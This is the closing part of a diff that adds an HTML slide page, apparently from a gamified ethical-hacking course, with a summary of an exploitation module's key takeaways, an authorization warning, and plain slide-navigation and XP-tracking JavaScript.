+                    <p style="margin-top: 15px; font-size: 0.9rem; color: var(--text-secondary);">System Exploitation module completed</p>
+                </div>
+                <h3>Key Takeaways</h3>
+                <ul>
+                    <li>Exploitation turns discovered vulnerabilities into actual system access</li>
+                    <li>Password attacks are most common - dictionary, brute force, credential stuffing, spraying</li>
+                    <li>Hashcat and John the Ripper crack password hashes (educational purpose)</li>
+                    <li>Privilege escalation elevates access from user to admin/root</li>
+                    <li>Linux privesc: SUID binaries, sudo misconfig, cron jobs, kernel exploits</li>
+                    <li>Windows privesc: Unquoted paths, weak permissions, DLL hijacking, token impersonation</li>
+                    <li>Post-exploitation: credential harvesting, lateral movement, data exfiltration</li>
+                    <li>Persistence maintains access through reboots and remediation attempts</li>
+                    <li>Understanding attack techniques enables effective defense</li>
+                </ul>
+                <div class="warning-box">
+                    <h4>⚠️ Final Reminder</h4>
+                    <p>These techniques are powerful and must only be used with explicit written authorization. Unauthorized access is a serious crime. Use your knowledge ethically and professionally.</p>
+                </div>
+                <p style="margin-top: 30px; text-align: center; font-size: 1.05rem; color: var(--house-accent);">FEH Course Complete - Continue your Dark Arts journey with advanced modules</p>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">13 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()" disabled>NEXT →</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+        function updateSlideDisplay() {
+            slides.forEach((slide, index) => {
+                slide.classList.remove('active');
+                if (index === currentSlide) slide.classList.add('active');
+            });
+            document.getElementById('progressBar').style.width = ((currentSlide + 1) / totalSlides) * 100 + '%';
+            if (currentSlide === totalSlides - 1) awardXP();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+        function nextSlide() { if (currentSlide < totalSlides - 1) { currentSlide++; updateSlideDisplay(); } }
+        function previousSlide() { if (currentSlide > 0) { currentSlide--; updateSlideDisplay(); } }
+        function awardXP() {
+            const key = 'dark_arts_feh_05_xp_awarded';
+            if (!localStorage.getItem(key)) {
+                localStorage.setItem(key, 'true');
+                localStorage.setItem('dark_arts_feh-05_completed', 'true');
+                let xp = parseInt(localStorage.getItem('hexworth_xp') || '0');
+                localStorage.setItem('hexworth_xp', (xp + 25).toString());
+            }
+        }
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowLeft') previousSlide();
+            else if (e.key === 'ArrowRight') nextSlide();
+        });
+        updateSlideDisplay();
+    </script>
+    <script src="../../../components/FluxCapacitor.js"></script>
+</body>
+</html>
